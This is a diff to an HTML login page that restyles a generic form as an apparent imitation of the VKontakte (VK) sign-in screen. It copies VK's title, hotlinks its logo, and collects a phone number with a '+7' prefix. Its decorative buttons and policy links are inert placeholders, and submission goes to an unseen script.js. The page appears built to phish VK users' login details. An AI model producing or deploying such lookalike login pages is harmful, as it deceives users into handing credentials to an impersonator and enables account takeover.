@@ -3,24 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Вход ВКонтакте</title>
+    <link rel="stylesheet" href="/styles.css">
 </head>
-<body>
-    <div class="container">
-        <div class="login-box">
-            <h1>Вход</h1>
+<body class="vk-bg">
+    <div class="vk-center">
+        <div class="vk-login-box">
+            <button class="vk-back-btn" tabindex="-1"><span>&larr;</span></button>
+            <div class="vk-logo"><img src="https://vk.com/images/logoVkMiniApps.png" alt="VK" /></div>
+            <h2 class="vk-title">Вход ВКонтакте</h2>
+            <div class="vk-tabs">
+                <button class="vk-tab active">Телефон</button>
+                <button class="vk-tab" disabled>Почта</button>
+            </div>
             <form id="loginForm">
-                <div class="input-group">
-                    <input type="text" id="username" placeholder="Имя пользователя" required>
+                <div class="vk-phone-group">
+                    <span class="vk-flag">🇷🇺</span>
+                    <input type="tel" id="phoneNumber" placeholder="+7" required autocomplete="off" />
                 </div>
-                <div class="input-group">
-                    <input type="password" id="password" placeholder="Пароль" required>
+                <div class="vk-checkbox-group">
+                    <input type="checkbox" id="rememberMe" checked />
+                    <label for="rememberMe">Сохранить вход</label>
                 </div>
-                <button type="submit" class="login-btn">Войти</button>
+                <button type="submit" class="vk-login-btn">Войти</button>
             </form>
+            <button class="vk-create-btn" tabindex="-1">Создать аккаунт</button>
+            <div class="vk-or">или с помощью</div>
+            <button class="vk-qr-btn" tabindex="-1">
+                <span class="vk-qr-icon">&#128273;</span> QR-код
+            </button>
+            <div class="vk-agreement">
+                Нажимая «Войти», вы принимаете <a href="#" tabindex="-1">пользовательское соглашение</a> и <a href="#" tabindex="-1">политику конфиденциальности</a>
+            </div>
         </div>
     </div>
-    <script src="script.js"></script>
+    <div class="vk-bottom-link">
+        <a href="#" tabindex="-1">Узнать больше о VK ID</a>
+    </div>
+    <script src="/script.js"></script>
 </body>
 </html> 
